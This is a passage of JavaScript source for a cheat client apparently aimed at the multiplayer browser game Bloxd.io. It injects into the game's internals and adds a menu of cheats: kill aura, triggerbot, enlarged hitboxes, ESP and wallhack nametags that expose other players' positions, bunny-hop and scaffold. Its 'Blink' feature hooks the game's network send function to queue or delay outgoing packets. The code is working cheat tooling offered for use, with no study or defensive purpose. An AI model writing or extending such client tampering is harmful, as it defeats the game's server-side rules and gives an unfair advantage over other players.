        Scene: scene.constructor,
        Engine: engine.constructor,
        Color3,
        StandardMaterial,
        addComponent,
        addKey
    };
    playerInventoryParent = shideFuxny.entities[shideFuxny.impKey].inventory.list[0].opWrapper


    function autoDetectChunkDataField(chunk) {
        for (const key of Object.keys(chunk)) {
            const val = chunk[key];
            if (!val) continue;

            if (
                typeof val === "object" &&
                Array.isArray(val.stride) &&
                val.stride.length === 3 &&
                (
                    Array.isArray(val.data) ||
                    ArrayBuffer.isView(val.data) // covers Uint16Array etc.
                )
            ) {
                console.log("✅ Detected chunk data field:", key);
                chunkDataField = key;
                return key;
            }
        }

        console.warn("❌ Failed to auto-detect chunk data field");
        return null;
    }

    autoDetectChunkDataField(Object.values(shideFuxny.world[shideFuxny.impKey].hash)[0]);

    const maybeEntity = r.values(r.values(shideFuxny.entities[shideFuxny.impKey])[22].list[0])[1];

    const hasDoAttackDirect = typeof maybeEntity?.doAttack === 'function';
    const hasDoAttackBreakingItem = typeof maybeEntity?.breakingItem?.doAttack === 'function';

    if (hasDoAttackDirect) {
        console.log("maybeEntity has doAttack");
        playerEntity = maybeEntity;
    } else if (hasDoAttackBreakingItem) {
        console.log("maybeEntity.breakingItem has doAttack");
        playerEntity = maybeEntity.breakingItem;
    } else {
        console.warn("Neither maybeEntity nor its breakingItem has doAttack");
        playerEntity = null;
    }




    mesh = null;
    scene = null;
    engine = null;
    StandardMaterial = null;
    Color3 = null;


    /*
    		(function findRenderingModule() {
    			const scene = shideFuxny?.Lion?.scene;
    			if (!scene) {
    				console.error("❌ shideFuxny.Lion.scene not set");
    				return;
    			}

    			for (const [key, val] of Object.entries(shideFuxny.NIGHT)) {
    				if (typeof val === "object" && val !== null) {
    					for (const nestedVal of Object.values(val)) {
    						if (nestedVal === scene) {
    							console.log(`✅ Found scene in noa["${key}"]`);
    							shideFuxny.rendering = val;
    							return;
    						}
    					}
    				}
    			}



    		})();

    */
	
	
	
function findOnlysendBytes(obj) {
  if (!obj) {
    console.warn("❌ Provided object is null or undefined.");
    return null;
  }

  const proto = Object.getPrototypeOf(obj);
  const props = Object.getOwnPropertyNames(proto);

  for (const key of props) {
    if (key === 'constructor') continue;

    const val = proto[key];
    if (typeof val === 'function') {
      const str = val.toString();

      // Looser but effective pattern detection
      const looksLikesendBytes =
        val.length === 2 &&
        /Protocol\.ROOM_DATA_BYTES/i.test(str) &&
        str.includes('Uint8Array') &&
        /typeof/.test(str) && // just check any typeof usage
        str.includes('.encode') &&
        (str.includes('.byteLength') || str.includes('.length')) &&
        str.includes('.set');

      if (looksLikesendBytes) {
        console.log(`✅ Real sendBytes found: ${key}`);
        return key;
      }
    }
  }

  console.warn("❌ sendBytes function not found.");
  return null;
}

// Usage
colyRoom = r.values(shideFuxny.bloxd.client.msgHandler)[0];
sendBytesName = findOnlysendBytes(colyRoom);

  if (!colyRoom || typeof colyRoom[sendBytesName] !== "function") {
    console.warn("[Blink] colyRoom or sendBytes not ready.");
  }

blinkState = {
    enabled: false,
    originalSendBytes: colyRoom[sendBytesName],
    queued: [],
    interval: 0,
    noPacket: false
  };



    startTargetFinder()


function setupKillAuraBox() {
	
    newBox = shideFuxny.Lion.Mesh.CreateBox("mesh", .5, false, 1, shideFuxny.Lion.scene);
    newBox.renderingGroupId = 1;
    newBoxId = shideFuxny.entities.add([0, 10, 0], null, null, newBox);

    //newBox.Da = true;
    newBox.material = new shideFuxny.Lion.StandardMaterial("mat", shideFuxny.Lion.scene);
    newBox.material.diffuseColor = new shideFuxny.Lion.Color3(1, 1, 1);
    newBox.material.emissiveColor = new shideFuxny.Lion.Color3(1, 1, 1);
    newBox.name = 'BodyMesh';
    newBox.id = 'BodyMesh';
    newBox.isVisible = false;
	if (!newBox.metadata) newBox.metadata = {};

    // Find null key
    __nullKey = null;
    for (const key in newBox) {
        if (key.length === 2 && newBox[key] === null) {
            __nullKey = key;
            break;
        }
    }
    if (__nullKey) {
        newBox[__nullKey] = false;
    }

    shideFuxny.entityList = r.values(shideFuxny.NIGHT)[30]

    humanoidMeshlist = shideFuxny.entities[shideFuxny.impKey]?.humanoidMesh?.list;
    __stringKey = null;
    if (Array.isArray(humanoidMeshlist)) {
        outerLoop: for (const obj of humanoidMeshlist) {
            for (const key in obj) {
                if (typeof obj[key] === "string") {
                    __stringKey = key;
                    break outerLoop;
                }
            }
        }
    }
    else {
        console.error("❌ Invalid humanoidMeshlist path.");
    }

    // Follow loop
    function followHeadLoop() {
        if (newBox) {
            const playerId = 1;
            const playerPosState = shideFuxny.entities.getState(playerId, "position");

            if (playerPosState && Array.isArray(playerPosState.position)) {
                const [x, y, z] = playerPosState.position;
                const newPos = [x, y + 1.5, z];
                shideFuxny.entities.setPosition(newBoxId, newPos);
            } else {
                console.error("Player position not found or invalid");
            }
        }

        animationFrameId = requestAnimationFrame(followHeadLoop);
    }

    // Start the loop
    animationFrameId = requestAnimationFrame(followHeadLoop);
}

setupKillAuraBox();


    passiveFeatures();
	
	document.addEventListener("keydown", (e) => {
    if (e.key.toLowerCase() === "g") {
        for (const key in shideFuxny.bloxd.entityNames) {
            if (key === "1") continue;

            const nameObj = shideFuxny.bloxd.entityNames[key];
            const state = shideFuxny.entities.getState(key, 'position');
            if (!state || !state.position) continue;

            const pos = state.position;
            const x = Math.round(pos[0]);
            const y = Math.round(pos[1]);
            const z = Math.round(pos[2]);

            // Remove existing position suffix if any (like "Name (x, y, z)")
            const baseName = nameObj.entityName.replace(/\s*\(\-?\d+,\s*\-?\d+,\s*\-?\d+\)$/, "");

            // Update with new position
            nameObj.entityName = `${baseName} (${x}, ${y}, ${z})`;
        }
    }
});



    const visitedTags = new WeakSet();

    function findParentOfNameTag(obj, path = '') {
        if (typeof obj !== 'object' || obj === null || visitedTags.has(obj)) return null;
        visitedTags.add(obj);

        for (const key in obj) {
            if (!Object.hasOwn(obj, key)) continue;
            try {
                const value = obj[key];
                const currentPath = path + (Array.isArray(obj) ? `[${key}]` : (path ? '.' : '') + key);

                if (value && typeof value === 'object' && value.id === '1NameTag') {
                    console.log("✅ Path to NameTag parent:", currentPath);
                    return obj;
                }

                const result = findParentOfNameTag(value, currentPath);
                if (result) return result;
            } catch {}
        }
        return null;
    }

    cachedNameTagParent = shideFuxny.Lion.scene //findParentOfNameTag(shideFuxny.world[shideFuxny.impKey].hash)     Все ебать.


    // Run the function every 15 seconds
    setInterval(makeHitboxes, 1000);



}



function findElementByText(text) {
    const all = document.querySelectorAll('div, span, button, a');
    for (const el of all)
        if (el.textContent.trim() === text) return el;
    return null;
}

function clickTeleportButton() {
    const teleportButtonText = findElementByText('Teleport To Lobby Spawn');
    if (teleportButtonText) {
        let clickable = teleportButtonText;
        while (clickable && !clickable.onclick && clickable.tagName !== 'BUTTON') clickable = clickable.parentElement;
        if (clickable) {
            console.log('Clicking teleport button:', clickable);
            clickable.click();
        } else {
            console.warn('No clickable parent found, trying to click text element itself');
            teleportButtonText.click();
        }
    } else console.warn('Teleport button text not found in DOM');
}


function toggleAutoPot() {
    if (!injectedBool) {

        showTemporaryNotification('You need to inject first habibi!')

    }
    autoPotionEnabled = !autoPotionEnabled;
    if (autoPotionEnabled) {
        autoPotionInterval = setInterval(movePotionToSlot, 1000);
        console.log("AutoPotion enabled");
    } else {
        clearInterval(autoPotionInterval);
        autoPotionInterval = null;
        console.log("AutoPotion disabled");
    }
    updateAutoPotButton();
}


function toggleNameTags() {
    if (!injectedBool) {

        showTemporaryNotification('You need to inject first habibi!')

    }
	everEnabled.nameTagsEnabled = true;

    nameTagsEnabled = !nameTagsEnabled;
    if (nameTagsEnabled) {
        if (!cachedNameTagParent) {
            nameTagsEnabled = false;
            return;
        }
        nameTagParent = cachedNameTagParent;
        nameTagsIntervalId = setInterval(() => {
            const entityList = shideFuxny.entityList;
            if (!entityList || typeof entityList !== 'object') return;

            for (const subGroup of Object.values(entityList)) {
                if (!subGroup || typeof subGroup !== 'object') continue;

                for (const obj of Object.values(subGroup)) {
                    if (obj?.lobbyLeaderboardValues) {
                        try {
                            const descTag = Object.getOwnPropertyDescriptor(obj, 'hasPriorityNametag');
                            if (!descTag || descTag.configurable) {
                                Object.defineProperty(obj, 'hasPriorityNametag', {
                                    get() {
                                        return true;
                                    },
                                    set(val) {
                                        if (val !== true) {}
                                    },
                                    configurable: true
                                });
                            }

                            const descSee = Object.getOwnPropertyDescriptor(obj, 'canSee');
                            if (!descSee || descSee.configurable) {
                                Object.defineProperty(obj, 'canSee', {
                                    get() {
                                        return true;
                                    },
                                    set(val) {
                                        if (val !== true) {}
                                    },
                                    configurable: true
                                });
                            }

                        } catch (e) {}
                    }
                }
            }

            for (const key in nameTagParent) {
                const tag = nameTagParent;
                if (tag && typeof tag === 'object' && typeof tag.id === 'string' && tag.id.includes('NameTag')) {
                    try {
                        const descVisible = Object.getOwnPropertyDescriptor(tag, '_isVisible');
                        if (!descVisible || descVisible.configurable) {
                            Object.defineProperty(tag, '_isVisible', {
                                get() {
                                    return true;
                                },
                                set(val) {
                                    if (val !== true) {}
                                },
                                configurable: true
                            });
                        }

                        const descRenderGroup = Object.getOwnPropertyDescriptor(tag, 'renderingGroupId');
                        if (!descRenderGroup || descRenderGroup.configurable) {
                            Object.defineProperty(tag, 'renderingGroupId', {
                                get() {
                                    return 3;
                                },
                                set(val) {
                                    if (val !== 3) {}
                                },
                                configurable: true
                            });
                        }
                    } catch (e) {}
                }
            }
        }, 15000);
        console.log("✅ NameTag visibility lock: ON");
    } else {
        clearInterval(nameTagsIntervalId);
        nameTagsIntervalId = null;
        if (nameTagParent) {
            for (const key in nameTagParent) {
                const tag = nameTagParent[key];
                if (tag && typeof tag === 'object' && typeof tag.id === 'string' && tag.id.includes('NameTag')) {
                    try {
                        const current = tag._isVisible;
                        delete tag._isVisible;
                        tag._isVisible = current;
                    } catch (e) {
                        console.warn("Failed to unlock _isVisible on", tag);
                    }
                }
            }
        }
        nameTagParent = null;
        console.log("🟡 NameTag visibility lock: OFF");
    }
    updateNameTagsButton();
}

function toggleBHOP() {
    if (!injectedBool) {

        showTemporaryNotification('You need to inject first habibi!')

    }
	everEnabled.bhopEnabled = true;
    bhopEnabled = !bhopEnabled;
    if (bhopEnabled) {
        if (!moveState || !physState) {
            console.warn("❌ BHOP references not initialized. Did you inject?");
            bhopEnabled = false;
            return;
        }
        bhopIntervalId = setInterval(bunnyHop, 10); //was 60
        console.log("BHOP: ON");
    } else {
        clearInterval(bhopIntervalId);
        bhopIntervalId = null;
        console.log("BHOP: OFF");
    }
    updateBHOPButton();
}

  const toggleBlink = (interval = 0, noPacket = false) => {
    blinkState.enabled = !blinkState.enabled;
    blinkState.interval = interval;
    blinkState.noPacket = noPacket;

    if (blinkState.enabled) {
      console.log(`[Blink] ENABLED — interval: ${interval}, noPacket: ${noPacket}`);

      colyRoom[sendBytesName] = (...args) => {

        const [J, T] = args;
        const send = () => blinkState.originalSendBytes.call(colyRoom, J, T);

        if (interval > 0) {
          setTimeout(send, interval);
        } else {
          blinkState.queued.push([J, T]);
        }
      };
    } else {
      console.log(`[Blink] DISABLED — sending ${blinkState.queued.length} packets.`);

      for (const [J, T] of blinkState.queued) {
        blinkState.originalSendBytes.call(colyRoom, J, T);
      }

      colyRoom[sendBytesName] = blinkState.originalSendBytes;
      blinkState.queued = [];
    }
  };

function toggleBlinkWrapper() {
    if (!injectedBool) {

        showTemporaryNotification('You need to inject first habibi!')

    }
	everEnabled.blinkEnabled = true;
	
	
	toggleBlink();
	updateBlinkButton();
}


// ⛏ BHOP logic
function bunnyHop() {
    if (!bhopEnabled || !physState.isOnGround?.() || moveState.crouching || moveState.speed < 0.05) return;
    moveState.jumping = true;
    physState._hadJumpInputPrevTick = false;
    setTimeout(() => {
        moveState.jumping = false;
    }, 20);
}




//////////////////////////////////////////////////////////////////////////////////////GUI

document.getElementById("rndAsciiGUI")?.remove();
document.getElementById("rndAsciiGUI_minimized")?.remove();

let miniPos = {
    left: 10,
    top: 10
};
let accent = {
    color: defaultColor,
    alpha: 1
};
let bg = {
    color: defaultBackGroundColor,
    alpha: defaultBackGroundTransparency,
    blur: defaultBackGroundBlur
};
let isGuiVisible = true;
let minimizedIcon = null;

const style = document.createElement("style");
style.textContent = `
  :root {
    --accent-color: ${defaultColor};
    --accent-gradient: ${defaultGradient};
    --accent-hover-color: ${defaultColor};
  }

  .gradient-indicator {
    background: var(--accent-gradient);
  }

  #rndAsciiGUI {
    position: fixed;
    top: 10vh;
    left: 10vw;
    width: 35vw; /* Change width to one-third of the original */
    height: auto;
    z-index: 999999;
    border-radius: 8px;
    overflow: hidden;
    font-family: sans-serif;
    pointer-events: none;
  }

  #rndAsciiTopBar {
    height: 40px;
    background: var(--accent-gradient);
    color: white;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 10px;
    cursor: move;
    pointer-events: auto;
  }

  #rndAsciiTopBar img {
    width: 24px;
    height: 24px;
    margin-right: 10px;
    border-radius: 4px;
  }

  #rndAsciiTopBarTitle {
    display: flex;
    align-items: center;
    pointer-events: auto;
  }

  #rndAsciiMinBtn {
    background: none;
    border: none;
    color: white;
    font-size: 18px;
    cursor: pointer;
    padding: 0 10px;
    pointer-events: auto;
  }

  #rndAsciiContent {
    display: flex;
    height: auto;
    pointer-events: auto;
  }

  #rndAsciiSidebar {
    width: 150px;
    display: flex;
    flex-direction: column;
  }

.rndAsciiBtn {
    box-sizing: border-box;
    padding: 12px 10px;
    color: rgba(255, 255, 255, 0.8);
    background: none;
    text-align: left;
    position: relative;
    cursor: pointer;
    outline: none;
    border: none;
    box-shadow: none;
    transition: all 0.2s;
    pointer-events: auto;
    font-size: 14px;
    height: 50px;
    display: flex;
    align-items: center;
    border-radius: 4px;
    margin: 2px 5px;
  }

  .rndAsciiBtn.active {
    font-weight: bold;
    background: rgba(255, 255, 255, 0.1);
  }

  .rndAsciiBtn:hover {
    background: rgba(255, 255, 255, 0.05);
  }

  .rndAsciiBtn.indicatorLine {
    position: absolute;
    bottom: 0;
    left: 0;
    height: 4px
    width: 0%;
    background: var(--accent-gradient);
    transition: width 0.3s;
    border-radius: 2px;
}


  #rndAsciiDivider {
    width: 2px;
    background: var(--accent-color, ${defaultColor});
    margin: 0 5px;
  }

  #rndAsciiPage {
    flex: 1;
    padding: 20px;
    color: white;
    overflow-y: auto;
    pointer-events: auto;
  }

  #rndAsciiGUI_minimized {
    position: fixed;
    width: 32px;
    height: 32px;
    background: var(--accent-gradient);
    border-radius: 4px;
    z-index: 999999;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: move;
    user-select: none;
    pointer-events: auto;
  }

  #rndAsciiGUI_minimized img {
    width: 20px;
    height: 20px;
    border-radius: 4px;
  }

  .rndAsciiGroup {
    margin-bottom: 20px;
  }

  .rndAsciiGroup label {
    display: block;
    margin-bottom: 4px;
    font-weight: bold;
  }

  input[type="range"] {
    width: 100%;
    accent-color: var(--accent-color, ${defaultColor});
    pointer-events: auto;
  }

  input[type="color"] {
    background: rgba(255, 255, 255, 0.1);
    border: none;
    outline: none;
    height: 30px;
    border-radius: 4px;
    cursor: pointer;
    pointer-events: auto;
  }

  input[type="text"] {
    background: rgba(255, 255, 255, 0.1);
    border: none;
    outline: none;
    height: 30px;
    border-radius: 4px;
    color: white;
    padding: 0 10px;
    pointer-events: auto;
  }
.gradient-border {
  position: relative;
  color: white;
  background-color: transparent;
  border: none; /* Remove the border from the main element */
  border-radius: 8px;
  cursor: pointer;
  z-index: 0;
}

`;
document.head.appendChild(style);




const gui = document.createElement("div");
gui.id = "rndAsciiGUI";
document.body.appendChild(gui);

const topHTML = `
  <style>
    #rndAsciiTopBarTitle span {
  text-shadow:
    0 0 5px rgba(255, 255, 255, 0.9),
    0 0 10px rgba(255, 255, 255, 0.8),
    0 0 15px rgba(255, 255, 255, 0.7);
}
  </style>
  <div id="rndAsciiTopBar">
    <div id="rndAsciiTopBarTitle">
      <img src="${ICON_URL}" alt="icon">
      <span>${TITLE}</span>
    </div>
    <button id="rndAsciiMinBtn">_</button>
  </div>
`;


const contentHTML = `
		  <div id="rndAsciiContent">
			<div id="rndAsciiSidebar"></div>
			<div id="rndAsciiDivider"></div>
			<div id="rndAsciiPage"></div>
		  </div>
		`;

gui.innerHTML = topHTML + contentHTML;

const sidebar = gui.querySelector("#rndAsciiSidebar");
const page = gui.querySelector("#rndAsciiPage");

const waterJumpBtn = createButton("Water Jump")
const hitboxBtn = createButton("Hitbox");
const wireframeBtn = createButton("Wireframes");
const espBtn = createButton("ESP");
const bhopBtn = createButton("BHOP");
const enemyHealthGuiBtn = createButton("Enemy Healh Bar")
const blinkBtn = createButton("Blink");
const chestESPBtn = createButton("Chest ESP");
const oreESPBtn = createButton("Ore ESP");
const nameTagBtn = createButton("Nametags")
const killAuraBtn = createButton("Kill Aura")
const skyBoxBtn = createButton("Night")
const wallJumpBtn = createButton("Wall Jump")
const triggerBotBtn = createButton("TriggerBot")
const pickupReachBtn = createButton("Pickup Reach")
const autoPotBtn = createButton("Auto Potion")
const knifeBtn = createButton("BHOP Knife")
const bigHeadsBtn = createButton("BIGHEADS")
const scaffoldBtn = createButton("Scaffold")
const slowHitBtn = createButton("Slow Hit")

const pageNames = [
    "Inject & Enumerate",
    "Combat",
    "Movement",
    "Visual",
    "World",
    "Settings"
];

const customizationElements = [];
const pageBtns = [];
const pageContents = [
    [],
    [hitboxBtn, killAuraBtn, triggerBotBtn, enemyHealthGuiBtn, autoPotBtn, bigHeadsBtn, slowHitBtn],
    [bhopBtn, knifeBtn, blinkBtn, waterJumpBtn, wallJumpBtn],
    [chestESPBtn, oreESPBtn, wireframeBtn, espBtn, nameTagBtn],
    [pickupReachBtn, skyBoxBtn, scaffoldBtn],
    customizationElements
];


function createButton(label) {
    const btn = document.createElement('button');
    btn.textContent = label;
    btn.className = 'rndAsciiBtn';
    btn.style.width = 'calc(100% - 10px)';
    btn.style.padding = '12px 10px';
    btn.style.position = 'relative';
    btn.style.margin = '3px 5px';
    btn.style.border = 'none';
    btn.style.borderRadius = '4px';
    btn.style.backgroundColor = 'rgba(255, 255, 255, 0.05)';
    btn.style.color = 'rgba(255, 255, 255, 0.8)';
    btn.style.cursor = 'pointer';
    btn.style.fontSize = '14px';
    btn.style.textAlign = 'left';
    btn.style.height = '50px';
    btn.style.display = 'flex';
    btn.style.alignItems = 'center';
    btn.style.transition = 'all 0.2s';

    const indicatorLine = document.createElement('div');
    indicatorLine.className = 'indicatorLine gradient-indicator';
    indicatorLine.style.position = 'absolute';
    indicatorLine.style.bottom = '0';
    indicatorLine.style.left = '0';
    indicatorLine.style.width = '0%';
    indicatorLine.style.height = '4px';
    indicatorLine.style.setProperty('height', '4px', 'important');
    indicatorLine.style.transition = 'width 0.3s';

    btn.appendChild(indicatorLine);
    btn.indicatorLine = indicatorLine;

    btn.onmouseenter = function() {
        this.style.backgroundColor = 'rgba(255, 255, 255, 0.15)';
    };

    btn.onmouseleave = function() {
        if (!this.classList.contains('active')) {
            this.style.backgroundColor = 'rgba(255, 255, 255, 0.05)';
        }
    };

    return btn;
}

for (let i = 0; i < pageNames.length; i++) {
    const btn = createButton(pageNames[i]);
    btn.indicatorLine.style.display = i === 0 ? "block" : "none";

    btn.onclick = () => {
        // Clear existing active styles
        pageBtns.forEach((b) => {
            b.classList.remove("active");
            b.style.backgroundColor = "rgba(255, 255, 255, 0.05)";
            b.style.fontWeight = "normal";
            b.indicatorLine.style.width = "0%";
        });

        // Apply active styles to current button
        btn.classList.add("active");
        btn.style.backgroundColor = "rgba(255, 255, 255, 0.15)";
        btn.style.fontWeight = "bold";
        btn.indicatorLine.style.width = "100%";

        // Clear current page content
        page.innerHTML = "";

        // Load appropriate page
        if (i === 0) {
            createPageOneContent(); // Inject page
        } else if (i === 5) {
            showCustomizationPage();
            pageContents[i].forEach(el => page.appendChild(el));
        } else {
            pageContents[i].forEach(el => page.appendChild(el));
        }
    };

    if (i === 0) btn.classList.add("active");
    sidebar.appendChild(btn);
    pageBtns.push(btn);
}




pageContents[0].forEach(el => page.appendChild(el));

function showCustomizationPage() {
    customizationElements.length = 0;

    const keybindGroup = document.createElement("div");
    keybindGroup.className = "rndAsciiGroup";

    keybindActions.forEach((bind) => {
        const bindLabel = document.createElement("label");
        bindLabel.textContent = `${bind.name} Keybind`;

        const bindInput = document.createElement("input");
        bindInput.type = "text";
        bindInput.value = bind.code;
        bindInput.dataset.name = bind.name;
        bindInput.style.outline = "none"; // Remove default focus outline

        bindInput.addEventListener("focus", () => {
            // Handler for keyboard keys
            const handleKeyDown = (event) => {
                event.preventDefault();
                const newKey = event.code;  // Keyboard key code like "KeyA", "ArrowUp"
                setNewKeybind(newKey);
            };

            // Handler for mouse buttons
            const handleMouseDown = (event) => {
                event.preventDefault();
                let newKey = null;
                switch(event.button) {
                    case 0: newKey = "MouseLeft"; break;
                    case 1: newKey = "MouseMiddle"; break;
                    case 2: newKey = "MouseRight"; break;
                    default: newKey = `MouseButton${event.button}`;
                }
                setNewKeybind(newKey);
            };

            // Common function to update keybind and cleanup listeners
            function setNewKeybind(newKey) {
                bindInput.value = newKey;

                const actionIndex = keybindActions.findIndex((action) => action.name === bind.name);
                if (actionIndex !== -1) {
                    keybindActions[actionIndex].code = newKey;

                    localStorage.setItem("customKeybinds_v1", JSON.stringify(
                        keybindActions.map(({ name, code }) => ({ name, code }))
                    ));
                }

                document.removeEventListener("keydown", handleKeyDown);
                document.removeEventListener("mousedown", handleMouseDown);
                bindInput.blur();
            }

            // Listen for either keyboard or mouse input once
            document.addEventListener("keydown", handleKeyDown, { once: true });
            document.addEventListener("mousedown", handleMouseDown, { once: true });
        });

        keybindGroup.appendChild(bindLabel);
        keybindGroup.appendChild(bindInput);
    });

    // Scrollable wrapper container to fix vertical overflow
    const wrapper = document.createElement("div");
    wrapper.style.maxHeight = "70vh";       // Limit height to 70% of viewport height
    wrapper.style.overflowY = "auto";       // Enable vertical scrolling when needed
    wrapper.style.padding = "10px";
    wrapper.style.margin = "10px 0";
    wrapper.style.border = "1px solid #ccc"; // Optional border for clarity

    wrapper.appendChild(keybindGroup);

    customizationElements.push(wrapper);

}

showCustomizationPage();

function applyTheme() {
    const accentRGBA = hexToRgba(accent.color, accent.alpha);
    const bgRGBA = hexToRgba(bg.color, bg.alpha);
    gui.style.setProperty("--accent-color", accent.color);
    gui.style.setProperty("--accent-gradient", defaultGradient);

    gui.style.background = bgRGBA;
    gui.style.backdropFilter = `blur(${bg.blur}px)`;

    // Apply the gradient to the minimized icon
    const minimizedIcon = document.getElementById("rndAsciiGUI_minimized");
    if (minimizedIcon) {
        minimizedIcon.style.background = `var(--accent-gradient)`;
    }

    // Apply the gradient to the indicator lines
    const indicatorLines = document.querySelectorAll(".indicatorLine");
    indicatorLines.forEach(line => {
        line.style.background = `var(--accent-gradient)`;
    });

    // Apply the gradient to all buttons
    // const buttons = document.querySelectorAll(".rndAsciiBtn");
    //  buttons.forEach(button => {
    //   button.style.background = `var(--accent-gradient)`;
    // });
    // I DIDNT WANT GRADIENT HERE


    const draggableAreas = document.querySelectorAll(".draggable-area");
    draggableAreas.forEach(area => {
        area.style.background = `var(--accent-gradient)`;
    });
}


// Helper function to get a complementary color
function getComplementaryColor(hex) {
    // Convert hex to RGB
    const r = parseInt(hex.slice(1, 3), 16);
    const g = parseInt(hex.slice(3, 5), 16);
    const b = parseInt(hex.slice(5, 7), 16);

    // Calculate complementary color
    const compR = (255 - r).toString(16).padStart(2, '0');
    const compG = (255 - g).toString(16).padStart(2, '0');
    const compB = (255 - b).toString(16).padStart(2, '0');

    return `#${compR}${compG}${compB}`;
}



function hexToRgba(hex, alpha = 1) {
    const [r, g, b] = hex.match(/\w\w/g).map(x => parseInt(x, 16));
    return `rgba(${r}, ${g}, ${b}, ${alpha})`;
}

applyTheme();

const topBar = gui.querySelector("#rndAsciiTopBar");
let dragging = false,
    offsetX = 0,
    offsetY = 0;

topBar.addEventListener("mousedown", (e) => {
    if (e.target.id === "rndAsciiMinBtn") return;
    dragging = true;
    const rect = gui.getBoundingClientRect();
    offsetX = e.clientX - rect.left;
    offsetY = e.clientY - rect.top;
    e.stopPropagation();
});

document.addEventListener("mousemove", (e) => {
    if (dragging) {
        gui.style.left = `${e.clientX - offsetX}px`;
        gui.style.top = `${e.clientY - offsetY}px`;
    }
});

document.addEventListener("mouseup", () => {
    dragging = false;
});

gui.querySelector("#rndAsciiMinBtn").onclick = () => {
    gui.style.display = "none";
    isGuiVisible = false;
    showMinimizedIcon();
};

function showMinimizedIcon() {
    minimizedIcon = document.createElement("div");
    minimizedIcon.id = "rndAsciiGUI_minimized";
    minimizedIcon.className = "minimized-icon";
    minimizedIcon.style.left = `${miniPos.left}px`;
    minimizedIcon.style.top = `${miniPos.top}px`;
    minimizedIcon.style.position = "fixed";
    minimizedIcon.style.width = "32px";
    minimizedIcon.style.height = "32px";
    minimizedIcon.style.background = accent.color; // Set the background color here
    minimizedIcon.style.borderRadius = "4px";
    minimizedIcon.style.zIndex = "130";
    minimizedIcon.style.display = "flex";
    minimizedIcon.style.alignItems = "center";
    minimizedIcon.style.justifyContent = "center";
    minimizedIcon.style.cursor = "move";
    minimizedIcon.style.userSelect = "none";
    minimizedIcon.style.pointerEvents = "auto";

    // Create a separate draggable area
    const draggableArea = document.createElement("div");
    draggableArea.className = "draggable-area";
    draggableArea.style.width = "100%";
    draggableArea.style.height = "100%";
    draggableArea.style.position = "absolute";
    draggableArea.style.cursor = "move";
    draggableArea.style.borderRadius = "4px";

    // Create the image element
    const img = document.createElement("img");
    img.src = ICON_URL;
    img.alt = "icon";
    img.style.width = "20px";
    img.style.height = "20px";
    img.style.borderRadius = "4px";
    img.style.pointerEvents = "none";

    minimizedIcon.appendChild(draggableArea);
    minimizedIcon.appendChild(img);
    document.body.appendChild(minimizedIcon);

    let draggingMini = false;
    let clickStart = 0;
    let offsetX = 0;
    let offsetY = 0;

    draggableArea.addEventListener("mousedown", (e) => {
        draggingMini = true;
        const rect = minimizedIcon.getBoundingClientRect();
        offsetX = e.clientX - rect.left;
        offsetY = e.clientY - rect.top;
        clickStart = Date.now();
        e.stopPropagation();
    });

    document.addEventListener("mousemove", (e) => {
        if (draggingMini) {
            const x = e.clientX - offsetX;
            const y = e.clientY - offsetY;
            minimizedIcon.style.left = `${x}px`;
            minimizedIcon.style.top = `${y}px`;
            miniPos = {
                left: x,
                top: y
            };
        }
    });

    document.addEventListener("mouseup", (e) => {
        if (!draggingMini) return;
        draggingMini = false;
        const moved = Math.abs(e.clientX - (miniPos.left + offsetX)) > 4 ||
            Math.abs(e.clientY - (miniPos.top + offsetY)) > 4;
        const shortClick = (Date.now() - clickStart) < 200;
        if (!moved && shortClick) {
            gui.style.display = "block";
            isGuiVisible = true;
            minimizedIcon.remove();
        }
    });
}


document.addEventListener("keydown", (e) => {
    if (e.key === openKey) {
        if (isGuiVisible) {
            gui.style.display = "none";
            isGuiVisible = false;
            showMinimizedIcon();
            if (shideFuxny.Props.pointerLockWrapper) {
                shideFuxny.Props.pointerLockWrapper.removePointerUnlockRequest("Menu")
            }
        } else {

            gui.style.display = "block";
            isGuiVisible = true;
            if (minimizedIcon) minimizedIcon.remove();
            if (shideFuxny.Props.pointerLockWrapper) {
                shideFuxny.Props.pointerLockWrapper.requestPointerUnlock("Menu")
            }
        }
    }
});

document.addEventListener("keydown", (event) => {
    for (const bind of keybindActions) {
        // No need to check bind.type — just compare code strings
        if (event.code === bind.code) {
            event.preventDefault();
            console.log(`Triggered: ${bind.name} via key ${event.code}`);
            bind.action?.();
        }
    }
});
document.addEventListener("mousedown", (event) => {
    let buttonName;
    switch (event.button) {
        case 0: buttonName = "MouseLeft"; break;
        case 1: buttonName = "MouseMiddle"; break;
        case 2: buttonName = "MouseRight"; break;
        default: buttonName = `MouseButton${event.button}`;
    }

    for (const bind of keybindActions) {
        if (buttonName === bind.code) {
            event.preventDefault();
            console.log(`Triggered: ${bind.name} via ${buttonName}`);
            bind.action?.();
        }
    }
});


let injectButton = null;

function createPageOneContent() {
    const page = document.getElementById("rndAsciiPage");
    page.innerHTML = "";

    const container = document.createElement("div");
    container.style.display = "flex";
    container.style.flexDirection = "column";
    container.style.justifyContent = "center";
    container.style.alignItems = "center";
    container.style.height = "100%";

    // Inject Button
    injectButton = document.createElement("button");
    injectButton.textContent = injectedBool ? "Injected!" : "Waiting for game...";
    injectButton.className = "rndAsciiBtn gradient-border";
    injectButton.disabled = true;
    Object.assign(injectButton.style, {
        backgroundImage: defaultGradient,
        color: "#fff",
        border: "none",
        padding: "2px 12px",
        fontSize: "14px",
        textShadow: "0 0 6px rgba(255, 255, 255, 0.6)",
        marginBottom: "8px",
        cursor: "pointer",
        width: "150px",
        height: "30px",
        boxSizing: "border-box",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        whiteSpace: "nowrap",
        overflow: "hidden",
        textOverflow: "ellipsis",
    });

    injectButton.style.textShadow = `
        0 0 5px #fff,
        0 0 10px ${defaultColor},
        0 0 20px ${defaultColor},
        0 0 30px ${defaultColor}
    `;

    injectButton.onmouseenter = () => {
        injectButton.style.boxShadow = "0 4px 12px rgba(0, 0, 0, 0.3)";
    };
    injectButton.onmouseleave = () => {
        injectButton.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.2)";
    };
    injectButton.onmousedown = () => {
        injectButton.style.transform = "scale(0.98)";
    };
    injectButton.onmouseup = () => {
        injectButton.style.transform = "scale(1)";
    };

    injectButton.onclick = () => {
        try {
            findNoaAndKey();
            if (!shideFuxny.NIGHT) {
                console.warn("❌ Could not find noa");
                injectButton.textContent = "Failed";
                return;
            }
            console.log("Injection completed!");
            injectButton.textContent = "Injected!";
            injectedBool = true;
            applyTheme();
        } catch (err) {
